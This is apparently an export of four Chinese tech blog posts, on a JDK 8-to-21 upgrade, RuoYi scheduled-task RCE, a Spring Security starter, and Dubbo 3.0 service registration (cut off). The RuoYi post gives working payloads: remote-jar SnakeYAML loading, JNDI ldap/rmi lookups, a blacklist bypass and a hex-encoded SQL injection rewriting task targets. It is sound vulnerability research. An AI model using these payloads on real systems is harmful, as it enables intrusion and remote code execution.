[{"title":"JDK从8升级到21的问题集","path":"//2025/jdk8to21/","content":"背景与挑战升级原因 Oracle长期支持策略 现代特性需求：协程、模式匹配、ZGC等 安全性与性能的需求 AI新技术引入的版本要求 项目情况 多项目并行升级的协同作战 多技术栈并存 持续集成体系的适配挑战 主要问题域与解决方案依赖管理的“蝴蝶效应” sun.misc.BASE64Encoder等内部API废弃 → 引发编译错误 JAXBJAX-WS从JDK核心剥离 → XML处理链断裂 Lombok与新版编译器兼容性问题（尤其record类型）核心原因在于JEP320提案：openjdk.orgjeps320 案例1：历史SDK的编译陷阱案例2：JAXB的模块化剥离Compilation failure: Compilation failure:#14 4.173 [ERROR] 不再支持源选项 6。请使用 8 或更高版本。#14 4.173 [ERROR] 不再支持目标选项 6。请使用 8 或更高版本。!-- 旧版本编译器配置导致构建失败 --plugin groupIdorg.apache.maven.plugins/groupId artifactIdmaven-compiler-plugin/artifactId version3.5/version configuration source1.6/source target1.6/target /configuration/pluginplugin groupIdorg.apache.maven.plugins/groupId artifactIdmaven-compiler-plugin/artifactId version3.13.0/version configuration release8/release!-- 统一使用release参数 -- /configuration/pluginjavax.xml.bind.JAXBException:Implementation of JAXB-API has not been founddependency groupIdorg.glassfish.jaxb/groupId artifactIdjaxb-runtime/artifactId version4.0.5/version/dependency 案例3：Lombok与新版编译器兼容性问题案例4：Resource注解找不到java: java.lang.NoSuchFieldErrordependency groupIdorg.projectlombok/groupId artifactIdlombok/artifactId version1.18.30/version/dependencyCaused by: java.lang.NoSuchMethodError: java.lang.String javax.annotation.Resource.lookup()at org.springframework.context.annotation.CommonAnnotationBeanPostProcessor$ResourceElement.init(CommonAnnotationBeanPostProcessor.java:664)at org.springframework.context.annotation.CommonAnnotationBeanPostProcessor.lambda$buildResourceMetadata$0(CommonAnnotationBeanPostProcessor.java:395)at org.springframework.util.ReflectionUtils.doWithLocalFields(ReflectionUtils.java:669)at org.springframework.context.annotation.CommonAnnotationBeanPostProcessor.buildResourceMetadata(CommonAnnotationBeanPostProcessor.java:377)at org.springframework.context.annotation.CommonAnnotationBeanPostProcessor.findResourceMetadata(CommonAnnotationBeanPostProcessor.java:358)at org.springframework.context.annotation.CommonAnnotationBeanPostProcessor.postProcessMergedBeanDefinition(CommonAnnotationBeanPostProcessor.java:306)at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.applyMergedBeanDefinitionPostProcessors(AbstractAutowireCapableBeanFactory.java:1116)at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:594)... 37 moredependency groupIdjakarta.annotation/groupId artifactIdjakarta.annotation-api/artifactId version1.3.5/version/dependencydependency groupIdjavax.annotation/groupId artifactIdjavax.annotation-api/artifactId version1.3.2/version/dependency# 上述两个依赖代码基本一样，推荐使用该版本：# jakarta.annotation:jakarta.annotation-api。 模块化的破与立 反射访问的模块墙 [ERROR] Unable to make field private int java.text.SimpleDateFormat.serialVersionOnStream accessible # 启动参数添加模块开放配置--add-opens java.base/java.text=ALL-UNNAMED--add-opens java.base/java.lang.reflect=ALL-UNNAMED 完整模块开放配置模板 export JAVA_OPTS=-Djava.library.path=/usr/local/lib -server -Xmx4096m --add-opens java.base/sun.security.action=ALL-UNNAMED--add-opens java.base/java.lang=ALL-UNNAMED--add-opens java.base/java.math=ALL-UNNAMED--add-opens java.base/java.util=ALL-UNNAMED--add-opens java.base/sun.util.calendar=ALL-UNNAMED--add-opens java.base/java.util.concurrent=ALL-UNNAMED--add-opens java.base/java.util.concurrent.locks=ALL-UNNAMED--add-opens java.base/java.security=ALL-UNNAMED--add-opens java.base/jdk.internal.loader=ALL-UNNAMED--add-opens java.management/com.sun.jmx.mbeanserver=ALL-UNNAMED--add-opens java.base/java.net=ALL-UNNAMED--add-opens java.base/sun.nio.ch=ALL-UNNAMED--add-opens java.management/java.lang.management=ALL-UNNAMED--add-opens jdk.management/com.sun.management.internal=ALL-UNNAMED--add-opens java.management/sun.management=ALL-UNNAMED--add-opens java.base/sun.security.action=ALL-UNNAMED--add-opens java.base/sun.net.util=ALL-UNNAMED--add-opens java.base/java.time=ALL-UNNAMED--add-opens java.base/java.lang.reflect=ALL-UNNAMED--add-opens java.base/java.io=ALL-UNNAMED 语法层面的”时空穿越”案例1：Base64编解码改造案例2：日期序列化问题JDK8写法（已废弃）BASE64Encoder encoder = newBASE64Encoder();String encoded = encoder.encode(data);JDK21规范写法Base64.Encoder encoder = Base64.getEncoder();String encoded = encoder.encodeToString(data);Caused by:java.lang.reflect.InaccessibleObjectException: Unable to make field private int java.text.SimpleDateFormat.serialVersionOnStream accessible解决方案：使用DateTimeFormatter替代SimpleDateFormat或添加模块开放参数：--add-opens java.base/java.text=ALL-UNNAMED 隐秘的”依赖战争”注解包冲突典型案例： [ERROR] javax.annotation.Resource exists in both jsr250-api-1.0.jar and jakarta.annotation-api-1.3.5.jar !-- 统一使用Jakarta标准 --dependency groupIdjakarta.annotation/groupId artifactIdjakarta.annotation-api/artifactId version2.1.1/version/dependency!-- 排除旧版本依赖 --exclusions exclusion groupIdjavax.annotation/groupId artifactIdjsr250-api/artifactId /exclusion/exclusions 构建体系的改造Maven插件兼容性问题： [ERROR] The plugin org.apache.maven.plugins:maven-compiler-plugin:3.13.0 requires Maven version 3.6.3 升级策略： 升级Maven版本 统一插件版本 build pluginManagement plugins plugin groupIdorg.apache.maven.plugins/groupId artifactIdmaven-compiler-plugin/artifactId version3.13.0/version /plugin plugin groupIdorg.apache.maven.plugins/groupId artifactIdmaven-war-plugin/artifactId version3.4.0/version /plugin /plugins /pluginManagement/build 最佳实践总结本地编译在本地进行编译，提前识别出语法错误、版本冲突及不兼容问题。 主要有以下几种场景： Base64：参照 【Base64编解码改造】 lombok：升级版本 jsr250、jaxb-runtime、jakarta.annotation-api：参照 【注解包冲突典型案例】 maven-compiler-plugin：升级版本 maven-resources-plugin：升级版本 maven-war-plugin：升级版本 行云构建同【本地编译】 行云部署 镜像不匹配：自定义镜像或者使用已申请的jdk21镜像 module权限不够：参照【完整模块开放配置模板】 JDSecurity加解密 所有数据库操作：important.properties配置文件的处理方式classpath:important.properties使用PropertyPlaceholderConfigurer进行处理不要用JDSecurityPropertyFactoryBean。 !-- bean id =secApplicationProperties class=com.jd.security.configsec.spring.config.JDSecurityPropertyFactoryBean--!-- property name=ignoreResourceNotFound value=true /--!-- property name=secLocation value=classpath:important.properties/--!-- /bean-- 运行 序列化异常 jdk21使用列表视图作为入参，导致jsf接口进行反序列化报错。报错代码如下： 报错代码如下： ListString subList = venderCodes.subList(i * batchSize, Math.min(venderCodes.size(), (i + 1) * batchSize));VendorQueryVo vendorQueryVo = new VendorQueryVo();vendorQueryVo.setVendorCodes(subList);// 该接口最多支持100条调用ListVendorVo batchVendorNameByVendorCode = vendorBaseInfoService.getBatchVendorNameByVendorCode(vendorQueryVo, I18NParamFactory.getJDI18nParam()); 将vendorQueryVo.setVendorCodes(subList)修改为vendorQueryVo.setVendorCodes(new ArrayList(subList))即可解决问题 ListString subList = venderCodes.subList(i * batchSize, Math.min(venderCodes.size(), (i + 1) * batchSize));VendorQueryVo vendorQueryVo = new VendorQueryVo();vendorQueryVo.setVendorCodes(new ArrayList(subList));// 该接口最多支持100条调用ListVendorVo batchVendorNameByVendorCode = vendorBaseInfoService.getBatchVendorNameByVendorCode(vendorQueryVo, I18NParamFactory.getJDI18nParam()); 线程上下文类找不到：使用多线程场景下尽可能使用显式指定线程池【默认情况下 不同运行环境的处理机制不同】 JVM调优垃圾回收调优： UseParallelGC UseG1GC UseZGC 是 Java 虚拟机（JVM）中三种不同的垃圾回收器（Garbage Collector, GC），它们的设计目标和使用场景有所不同。以下是它们的区别： 特性 UseParallelGC UseG1GC UseZGC 设计目标 高吞吐量 平衡吞吐量和延迟 极低延迟 暂停时间 较长 较短 极短 适用堆大小 中小堆（几 GB 到几十 GB） 大堆（几十 GB 到几百 GB） 超大堆（TB 级别） CPU 消耗 中等 中等 较高 适用场景 批处理、计算密集型任务 对延迟有一定要求的应用 对延迟极其敏感的应用 如果你的应用对吞吐量要求高，且可以接受较长的暂停时间，选择UseParallelGC。 如果你的应用对延迟有一定要求，且堆内存较大，选择UseG1GC。 如果你的应用对延迟极其敏感，且堆内存非常大，选择UseZGC。 仅供参考，具体请按照实际情况来进行调整。"},{"title":"若依最新版后台RCE","path":"//2024/ruoyi-rce/","content":"计划任务实现原理从官方文档可以看出可以通过两种方法调用目标类： Bean调用示例：ryTask.ryParams(‘ry’) Class类调用示例：com.ruoyi.quartz.task.RyTask.ryParams(‘ry’) 接下来咱调试一下，看看具体是如何实现的这个功能的 首先直接在测试类下个断点，看看调用 通过系统默认的任务1来执行这个测试类 在调用过程中，会发现在com.ruoyi.quartz.util.JobInvokeUtil类中存在两个名为invokeMethod的方法，并前后各调用了一次 在第一个invokeMethod方法中对调用目标字符串的类型进行判断，判断是Bean还是Class。然后调用第二个invokeMethod方法 bean就通过getBean()直接获取bean的实例 类名就通过反射获取类的实例 if (!isValidClassName(beanName)) Object bean = SpringUtils.getBean(beanName); invokeMethod(bean, methodName, methodParams); else Object bean = Class.forName(beanName).newInstance(); invokeMethod(bean, methodName, methodParams); 第二个invokeMethod这个方法通过反射来加载测试类 if (StringUtils.isNotNull(methodParams) methodParams.size() 0) Method method = bean.getClass().getDeclaredMethod(methodName, getMethodParamsType(methodParams)); method.invoke(bean, getMethodParamsValue(methodParams)); 这大概就是定时任务加载类的逻辑 漏洞原因接着我们新增一个定时任务，看看在创建的过程中对调用目标字符串做了哪些处理 抓包可以看到直接调用了/monitor/job/add这个接口 可以看到就只是判断了一下，目标字符串是否包含rmi://，这就导致导致攻击者可以调用任意类、方法及参数触发反射执行命令。 由于反射时所需要的：类、方法、参数都是我们可控的，所以我们只需传入一个能够执行命令的类方法就能达到getshell的目的，该类只需要满足如下几点要求即可： 具有public类型的无参构造方法 自身具有public类型且可以执行命令的方法 4.6.2因为目前对调用目标字符串限制不多，so直接拿网上公开的poc打吧！ 使用Yaml.load()来打SnakeYAML反序列化 JNDI注入 SnakeYAML反序列化探测SnakeYAMLpoc： String poc = !!java.net.URL [\\http://5dsff0.dnslog.cn/\\]: 1; 利用SPI机制-基于ScriptEngineManager利用链来执行命令，直接使用这个师傅写好的脚本：https://github.com/artsploit/yaml-payload 把这块修改成要执行的命令 把项目生成jar包 javac src/artsploit/AwesomeScriptEngineFactory.java // 编译java文件jar -cvf yaml-payload.jar -C src/ . // 打包成jar包 在yaml-payload.jar根目录下起一个web服务 python -m http.server 9999 在计划任务添加payload，执行 org.yaml.snakeyaml.Yaml.load(!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [http://127.0.0.1:9999/yaml-payload.jar]]]]) JNDI注入使用yakit起一个返连服务 poc： javax.naming.InitialContext.lookup(ldap://127.0.0.1:8085/calc) nc监听端口 4.6.2rmi上边的分析是拿4.6.2版本分析的，在创建定时任务时会判断目标字符串中有没有rmi关键字。后边有拐回来看一下，发现在4.6.2版本以下，在创建定时任务时是没有任何过滤的。 所以在补充一个rmi的poc： org.springframework.jndi.JndiLocatorDelegate.lookup(rmi://127.0.0.1:1099/refObj) 4.7.04.6.2 ~ 4.7.1新增黑名单限制调用字符串 定时任务屏蔽ldap远程调用 定时任务屏蔽http(s)远程调用 定时任务屏蔽rmi远程调用 来个小插曲，之前又看到一个文章，阅读量还不少类，师傅给出的poc是利用范围是**4.7.2** 后边发现不止这一篇，其他就不在举例了。 但是我去翻了diff，发现在4.7.1中的黑名单已经过滤了这些poc。 单引号绕过在4.7.0的版本以下，仅仅只是屏蔽了ldap、http(s)、ldap。这里可以结合若依对将参数中的所有单引号替换为空来绕过 poc、例如： org.springframework.jndi.JndiLocatorDelegate.lookup(rmi://127.0.0.1:1099/refObj) 分析： 创建任务时rmi可以绕过对rmi的过滤 之前分析的定时任务运行的原理，会在com.ruoyi.quartz.util.JobInvokeUtil类中第一个invokeMethod方法调用getMethodParams方法来获取参数 跟进之后发现会把参数中的替换为空 打个断点调试一下 4.7.2在这个版本下可以看到有可以看到有ldaps、配置文件rce等方法bypass，网上挺多文章的就不分析了 4.7.3在4.7.3的版本下，又增加了白名单，只能调用com.ruoyi包下的类！并且把之前所有的路堵死了 4.7.8（最新版）依旧是没办法绕过黑白名单的限制。之前我们大概分析了一下定时任务的创建。对调用目标字符串过滤是在定时任务创建时进行的 审计之后可以看到，对目标字符串的过滤只发生在增加、修改计划任务时 创建后的定时任务信息存储在sys_job表中 结合4.7.5 版本下的sql注入漏洞，直接修改表中的数据参考：https://gitee.com/y_project/RuoYi/issues/I65V2B 在com.ruoyi.generator.controller.GenController#create 这块直接调用了genTableService.createTable()，咱直接跟进去看看 Mapper语句： 接下来创建一个定时任务调用这个类，直接从sys_job表中把某一个定时任务调用目标字符串(invoke_target字段)改了 先谈个dnslog试试 genTableServiceImpl.createTable(UPDATE sys_job SET invoke_target = javax.naming.InitialContext.lookup(ldap://xcrlginufj.dgrh3.cn) WHERE job_id = 1;) 但会触发黑名单 由于是执行sql语句，直接将value转为16进制即可 genTableServiceImpl.createTable(UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e496e697469616c436f6e746578742e6c6f6f6b757028276c6461703a2f2f7863726c67696e75666a2e64677268332e636e2729 WHERE job_id = 1;) 可以成功创建 运行后任务1的调用目标字符串也被成功修改 紧接着运行任务1 接下来弹个计算机 yakit开个反连，配置一下 执行上边的步骤修改任务1，在运行任务1 总结碰上前言中说到的事确实感到挺无奈却又无可奈何。也有可能是我能力不够分析有误，如果有问题希望各位师傅及时指正！ 参考https://xz.aliyun.com/t/10687 https://y4tacker.github.io/2022/02/08/year/2022/2/SnakeYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%8F%AF%E5%88%A9%E7%94%A8Gadget%E5%88%86%E6%9E%90 https://www.cnblogs.com/pursue-security/p/17658404.html#_label1_3 https://xz.aliyun.com/t/10957 https://github.com/luelueking/RuoYi-v4.7.8-RCE-POC"},{"title":"自定义Spring-boot-starter-security","path":"//2024/spring-boot-starter-security/","content":"maven依赖!-- security启动器 --dependency groupIdorg.springframework.boot/groupId artifactIdspring-boot-starter-security/artifactId version3.3.2/version/dependency!-- 依赖web环境 --dependency groupIdorg.springframework.boot/groupId artifactIdspring-boot-starter-web/artifactId scopeprovided/scope version3.3.2/version/dependency 配置对@PermitAll接口放行 配置WebSecurityConfigurerAdapter @AutoConfiguration@AutoConfigureOrder(-1) // 目的：先于 Spring Security 自动配置，避免一键改包后，org.* 基础包无法生效@EnableMethodSecurity(securedEnabled = true) // 方法级别安全性控制public class CustomWebSecurityConfigurerAdapter @Resource private ApplicationContext applicationContext; /** * 在 Spring Security 5.7 之后通过注册SecurityFilterChain的Bean方式替代依赖实现WebSecurityConfigurerAdapter接口的方式 * @param httpSecurity * @return * @throws Exception */ @Bean protected SecurityFilterChain filterChain(HttpSecurity httpSecurity) throws Exception // 通用配置 httpSecurity // 开启跨域 .cors(Customizer.withDefaults()) // CSRF 禁用，因为不使用 Session .csrf(AbstractHttpConfigurer::disable); // 获得 @PermitAll 带来的 URL 列表，免登录 MultimapHttpMethod, String permitAllUrls = getPermitAllUrlsFromAnnotations(); httpSecurity // ①：全局共享规则 .authorizeHttpRequests(c -c // 1.1 静态资源，可匿名访问 .requestMatchers(HttpMethod.GET, /*.html, /*.html, /*.css, /*.js).permitAll() // 1.2 设置 @PermitAll 无需认证 .requestMatchers(HttpMethod.GET, permitAllUrls.get(HttpMethod.GET).toArray(new String[0])).permitAll() .requestMatchers(HttpMethod.POST, permitAllUrls.get(HttpMethod.POST).toArray(new String[0])).permitAll() .requestMatchers(HttpMethod.PUT, permitAllUrls.get(HttpMethod.PUT).toArray(new String[0])).permitAll() .requestMatchers(HttpMethod.DELETE, permitAllUrls.get(HttpMethod.DELETE).toArray(new String[0])).permitAll() .requestMatchers(HttpMethod.HEAD, permitAllUrls.get(HttpMethod.HEAD).toArray(new String[0])).permitAll() .requestMatchers(HttpMethod.PATCH, permitAllUrls.get(HttpMethod.PATCH).toArray(new String[0])).permitAll() // 放行 Knife4j 和 Swagger 相关的 URL .requestMatchers( /swagger-ui/**, /swagger-resources/**, /v3/api-docs/**, /webjars/**, /doc.html ).permitAll()) // ③：兜底规则，必须认证 .authorizeHttpRequests(c - c.anyRequest().authenticated()); return httpSecurity.build(); /** * Multimap:Google 的 Guava 库，提供.类似于 Map，但每个键可以关联多个值 * */ private MultimapHttpMethod,String getPermitAllUrlsFromAnnotations() MultimapHttpMethod, String result = HashMultimap.create(); // 获得接口对应的 HandlerMethod 集合 RequestMappingHandlerMapping handlerMapping = applicationContext.getBean(RequestMappingHandlerMapping.class); // 获取所有的 HandlerMethod 映射关系 MapRequestMappingInfo, HandlerMethod handlerMethods = handlerMapping.getHandlerMethods(); // 筛选出带有@PermitAll注解的接口 for (Map.EntryRequestMappingInfo, HandlerMethod entry : handlerMethods.entrySet()) RequestMappingInfo requestMappingInfo = entry.getKey(); HandlerMethod handlerMethod = entry.getValue(); // 如果该接口没有@PermitAll注解 if (!handlerMethod.hasMethodAnnotation(PermitAll.class)) continue; SetString urls = new HashSet(); // 多路径的情况 @PostMapping(/login,/hello,zef) if (Objects.nonNull(requestMappingInfo.getPatternsCondition())) urls.addAll(entry.getKey().getPatternsCondition().getPatterns()); // 单路径的情况 @PostMapping(/login) if (Objects.nonNull(requestMappingInfo.getPathPatternsCondition())) urls.addAll(convertList(requestMappingInfo.getPathPatternsCondition().getPatterns(), PathPattern::getPatternString)); if (urls.isEmpty())continue; // 根据请求方法，添加到 result 结果 requestMappingInfo.getMethodsCondition().getMethods().forEach(requestMethod - switch (requestMethod) case GET: result.putAll(HttpMethod.GET, urls); break; case POST: result.putAll(HttpMethod.POST, urls); break; case PUT: result.putAll(HttpMethod.PUT, urls); break; case DELETE: result.putAll(HttpMethod.DELETE, urls); break; case HEAD: result.putAll(HttpMethod.HEAD, urls); break; case PATCH: result.putAll(HttpMethod.PATCH, urls); break; ); return result; public static T, U ListU convertList(CollectionT from, FunctionT, U func) if (CollUtil.isEmpty(from)) return new ArrayList(); return from.stream().map(func).filter(Objects::nonNull).collect(Collectors.toList()); 配置 spring.factories 具体关于SpringBoot自定义Starter的实现思路 创建项目：首先创建一个新 Maven 项目，命名为 xxx-spring-boot-starter 添加依赖：确保spring-boot-autoconfigure依赖已添加，以支持自动配置功能。 配置类：编写AutoConfiguration配置类，并使用注解@Configuration和@ConditionlOnMissingBean来实现有条件加载Bean 定义功能：比如要封装一个特定的服务（如短信发送服务），定义接口和实现类，将其逻辑写入@Service标注的实现类中 自动配置：在META-INF/spring/org.springframework.boot.autocnfigure.AutoConfiguration.imports中指定自动配置类的位置。 与SpringBoot2.X不同，SpringBoot3.X不再使用sping.factories文件。 完成以上配置 我们可以在Controller类上添加注解将会被Spring Security放行了 @PostMapping(/login)@PermitAll @Operation(summary = 使用账号密码登录)public CommonResultAuthLoginRespVO login(@RequestBody @Valid AuthLoginReqVO reqVO) return success(authService.login(reqVO));"},{"title":"dubbo3.0 服务导入导出原理","path":"//2024/double-v3/","content":"作者：京东物流 张士欣 不管是服务导出还是服务引入，都发生在应用启动过程中。比如：在启动类上加上@EnableDubbo时，该注解上有一个@DubboComponentScan注解，@DubboComponentScan 注解Import了一个DubboComponentScanRegistrar，DubboComponentScanRegistrar中会调用DubboSpringInitializer.initialize()，该方法中会注册一个DubboDeployApplicationListener，而DubboDeployApplicationListener会监听Spring容器启动完成事件ContextRefreshedEvent，一旦接收到这个事件后，就会开始Dubbo的启动流程，就会执行DefaultModuleDeployer的start()进行服务导出与服务引入。 在启动过程中，在做完服务导出与服务引入后，还会做几件非常重要的事情： 导出一个应用元数据服务（就是一个 MetadataService 服务，这个服务也会注册到注册中心），或者将应用元数据注册到元数据中心； 生成当前应用的实例信息对象 ServiceInstance，比如：应用名、实例 ip、实例 port，并将实例信息注册到注册中心，也就是应用级注册； 服务导出当在某个接口的实现类上加上 @DubboService 后，就表示定义了一个 Dubbo 服务，应用启动时 Dubbo 只要扫描到了 @DubboService，就会解析对应的类，得到服务相关的配置信息，比如： 服务的类型，也就是接口，接口名就是服务名； 服务的具体实现类，也就是当前类； 服务的 version、timeout 等信息，就是 @DubboService 中所定义的各种配置； 解析完服务的配置信息后，就会把这些配置信息封装成为一个 ServiceConfig 对象，并调用其 export() 进行服务导出，此时一个 ServiceConfig 对象就表示一个 Dubbo 服务。 而所谓的服务导出，主要就是完成三件事情： 确定服务的最终参数配置； 按不同协议启动对应的 Server（服务暴露）； 将服务注册到注册中心（服务注册）； 确定服务参数一个 Dubbo 服务，除开服务的名字，也就是接口名，还会有很多其他的属性，比如：超时时间、版本号、服务所属应用名、所支持的协议及绑定的端口等众多信息。 但是，通常这些信息并不会全部在 @DubboService 中进行定义，比如：一个 Dubbo 服务肯定是属于某个应用的，而一个应用下可以有多个 Dubbo 服务，所以可以在应用级别定义一些通用的配置，比如协议。 在 application.yml 中定义： dubbo: application: name: dubbo-springboot-demo-provider protocol: name: tri port: 20880 表示当前应用下所有的 Dubbo 服务都支持通过 tri 协议进行访问，并且访问端口为 20880，所以在进行某个服务的服务导出时，就需要将应用中的这些配置信息合并到当前服务的配置信息中。 另外，除开可以通过 @DubboService 来配置服务，也可以在配置中心对服务进行配置，比如：在配置中心中配置： dubbo.service.org.apache.dubbo.samples.api.DemoService.timeout=5000 表示当前服务的超时时间为 5s。 所以，在服务导出时，也需要从配置中心获取当前服务的配置，如果在 @DubboService 中也定义了 timeout，那么就用配置中心的覆盖掉，配置中心的配置优先级更高。 最终确定出服务的各种参数，这块内容和 Dubbo2.7 一致。 服务注册当确定好了最终的服务配置后，Dubbo 就会根据这些配置信息生成对应的服务 URL，比如： tri://192.168.65.221:20880/org.apache.dubbo.springboot.demo.DemoService?application=dubbo-springboot-demo-providertimeout=3000 这个 URL 就表示了一个 Dubbo 服务，服务消费者只要能获得到这个服务 URL，就知道了关于这个 Dubbo 服务的全部信息，包括服务名、支持的协议、ip、port、各种配置。 确定了服务 URL 之后，服务注册要做的事情就是把这个服务 URL 存到注册中心（比如：Zookeeper）中去，说的再简单一点，就是把这个字符串存到 Zookeeper中去，这个步骤其实是非常简单的，实现这个功能的源码在 RegistryProtocol 中的 export() 方法中，最终服务 URL 存在了 Zookeeper 的 /dubbo/接口名/providers 目录下。 但是服务注册并不仅仅就这么简单，既然上面的这个 URL 表示一个服务，并且还包括了服务的一些配置信息，那这些配置信息如果改变了呢？比如：利用 Dubbo管理台中的动态配置功能（注意，并不是配置中心）来修改服务配置，动态配置可以应用运行过程中动态的修改服务的配置，并实时生效。 如果利用动态配置功能修改了服务的参数，那此时就要重新生成服务 URL 并重新注册到注册中心，这样服务消费者就能及时的获取到服务配置信息。 而对于服务提供者而言，在服务注册过程中，还需要能监听到动态配置的变化，一旦发生了变化，就根据最新的配置重新生成服务 URL，并重新注册到中心。 应用级注册在 Dubbo3.0 之前，Dubbo 是接口级注册，服务注册就是把接口名以及服务配置信息注册到注册中心中，注册中心存储的数据格式大概为： 接口名1：tri://192.168.1.221:20880/接口名1?application=应用名接口名2：tri://192.168.1.221:20880/接口名2?application=应用名接口名3：tri://192.168.1.221:20880/接口名3?application=应用名 key 是接口名，value 就是服务 URL，上面的内容就表示现在有一个应用，该应用下有 3 个接口，应用实例部署在 192.168.1.221，此时，如果给该应用增加一个实例，实例 ip 为192.168.1.222，那么新的实例也需要进行服务注册，会向注册中心新增 3 条数据： 接口名1：tri://192.168.1.221:20880/接口名1?application=应用名接口名2：tri://192.168.1.221:20880/接口名2?application=应用名接口名3：tri://192.168.1.221:20880/接口名3?application=应用名接口名1：tri://192.168.1.222:20880/接口名1?application=应用名接口名2：tri://192.168.1.222:20880/接口名2?application=应用名接口名3：tri://192.168.1.222:20880/接口名3?application=应用名 可以发现，如果一个应用中有 3 个 Dubbo 服务，那么每增加一个实例，就会向注册中心增加 3 条记录，那如果一个应用中有 10 个 Dubbo 服务，那么每增加一个实例，就会向注册中心增加 10 条记录，注册中心的压力会随着应用实例的增加而剧烈增加。 反过来，如果一个应用有 3 个 Dubbo 服务，5 个实例，那么注册中心就有 15 条记录，此时增加一个 Dubbo 服务，那么注册中心就会新增 5 条记录，注册中心的压力也会剧烈增加。 注册中心的数据越多，数据就变化的越频繁，比如：修改服务的 timeout，那么对于注册中心和应用都需要消耗资源用来处理数据变化。 所以为了降低注册中心的压力，Dubbo3.0 支持了应用级注册，同时也兼容接口级注册，用户可以逐步迁移成应用级注册，而一旦采用应用级注册，最终注册中心的数据存储就变成为： 应用名：192.168.1.221:20880应用名：192.168.1.222:20880 表示在注册中心中，只记录应用所对应的实例信息（IP + 绑定的端口），这样只有一个应用的实例增加了，那么注册中心的数据才会增加，而不关心一个应用中到底有多少个 Dubbo 服务。 这样带来的好处就是，注册中心存储的数据变少了，注册中心中数据的变化频率变小了，并且使用应用级注册，使得 Dubbo3 能实现与异构微服务体系如：Spring Cloud、Kubernetes Service 等在地址发现层面更容易互通， 为连通 Dubbo 与其他微服务体系提供可行方案。 应用级注册带来了好处，但是对于 Dubbo 来说又出现了一些新的问题，比如：原本，服务消费者可以直接从注册中心就知道某个 Dubbo 服务的所有服务提供者以及相关的协议、ip、port、配置等信息，那现在注册中心上只有 ip、port，那对于服务消费者而言：服务消费者怎么知道现在它要用的某个 Dubbo 服务，也就是某个接口对应的应用是哪个呢？ 对于这个问题，在进行服务导出的过程中，会在 Zookeeper 中存一个映射关系，在服务导出的最后一步，在 ServiceConfig 的 exported() 方法中，会保存这个映射关系：接口名：应用名。这个映射关系存在 Zookeeper 的 dubbomapping 目录下，存了这个信息后，消费者就能根据接口名找到所对应的应用名了。 消费者知道了要使用的 Dubbo 服务在哪个应用，那也就能从注册中心中根据应用名查到应用的所有实例信息（ ip + port ），也就是可以发送方法调用请求了，但是在真正发送请求之前，还得知道服务的配置信息，对于消费者而言，它得知道当前要调用的这个 Dubbo 服务支持什么协议、timeout 是多少，那服务的配置信息从哪里获取呢？ 之前的服务配置信息是直接从注册中心就可以获取到的，就是服务 URL 后面，但是现在不行了，现在需要从服务提供者的元数据服务获取，前面提到过，在应用启动过程中会进行服务导出和服务引入，然后就会暴露一个应用元数据服务，其实这个应用元数据服务就是一个 Dubbo 服务（Dubbo 框架内置的，自己实现的 ），消费者可以调用这个服务来获取某个应用中所提供的所有 Dubbo 服务以及服务配置信息，这样也就能知道服务的配置信息了。 知道了应用注册的好处，以及相关问题的解决方式，那么来看它到底是如何实现的。 首先，我们可以通过配置 dubbo.application.register-mode 来控制： instance：表示只进行应用级注册； interface：表示只进行接口级注册； all：表示应用级注册和接口级注册都进行，默认； 不管是什么注册，都需要存数据到注册中心，而 Dubbo3 的源码实现中会根据所配置的注册中心生成两个 URL（不是服务 URL，可以理解为注册中心 URL，用来访问注册中心的）: service-discovery-registry:127.0.0.1:2181org.apache.dubbo.registry.RegistryService?applicationdubbospringboot-demoprovider dubbo2.0.2pid13072qos.enablefalse®istryzookeeper×tamp1651755501660 registry:127.0.0.1:2181org.apache.dubbo.registry.RegistryService?applicationdubbo-springboot-demoprovider dubbo2.0.2pid13072qos.enablefalse®istryzookeeper×tamp1651755501660 这两个 URL 只有 schema 不一样，一个是 service-discovery-registry，一个是 registry，而 registry 是 Dubbo3 之前就存在的，也就代表接口级服务注册，而service-discovery-registry 就表示应用级服务注册。 在服务注册相关的源码中，当调用 RegistryProtocol 的 export() 方法处理 registry: 时，会利用 ZookeeperRegistry 把服务 URL 注册到 Zookeeper 中去，这就是接口级注册。 而类似，当调用 RegistryProtocol 的 export() 方法处理 service-discovery-registry: 时，会利用 ServiceDiscoveryRegistry 来进行相关逻辑的处理，那是不是就是在这里把应用信息注册到注册中心去呢？并没有这么简单。 首先，不可能每导出一个服务就进行一次应用注册，太浪费了，应用注册只要做一次就行了 其次，如果一个应用支持了多个端口，那么应用注册时只要挑选其中一个端口作为实例端口就可以了（该端口只要能接收到数据就行） 前面提到，应用启动过程中要暴露应用元数据服务，所以在此处也还是要收集当前所暴露的服务配置信息，以提供给应用元数据服务 所以 ServiceDiscoveryRegistry 在注册一个服务 URL 时，并不会往注册中心存数据，而只是把服务 URL 存到到一个 MetadataInfo 对象中，MetadataInfo 对象中就保存了当前应用中所有的 Dubbo 服务信息：服务名、支持的协议、绑定的端口、timeout 等。 前面提到过，在应用启动的最后，才会进行应用级注册，而应用级注册就是当前的应用实例上相关的信息存入注册中心，包括： 应用的名字； 获取应用元数据的方式； 当前实例的 ip 和 port； 当前实例支持哪些协议以及对应的 port； 比如： name:dubbo-springboot-demo-provider, id:192.168.65.221:20882, address:192.168.65.221, port:20882, sslPort:null, payload: @class:org.apache.dubbo.registry.zookeeper.ZookeeperInstance, id:192.168.65.221:20882, name:dubbo-springboot-demo-provider, metadata: dubbo.endpoints:[port:20882,protocol:dubbo,port:50051,protocol:tri], dubbo.metadata-service.url-params:connections:1,version:1.0.0,dubbo:2.0.2,side:provider,port:20882,protocol:dubbo, dubbo.metadata.revision:65d5c7b814616ab10d32860b54781686, dubbo.metadata.storage-type:local , registrationTimeUTC:1654585977352, serviceType:DYNAMIC, uriSpec:null 一个实例上可能支持多个协议以及多个端口，那如何确定实例的 ip 和端口呢？ 答案是：获取 MetadataInfo 对象中保存的所有服务 URL，优先取 dubbo 协议对应 ip 和 port，没有 dubbo 协议则所有服务 URL 中的第一个 URL 的 ip 和 port。 另外一个协议一般只会对应一个端口，但是如何就是对应了多个，比如： dubbo: application: name: dubbo-springboot-demo-provider protocols: p1: name: dubbo port: 20881 p2: name: dubbo port: 20882 p3: name: tri port: 50051 如果是这样，最终存入 endpoint 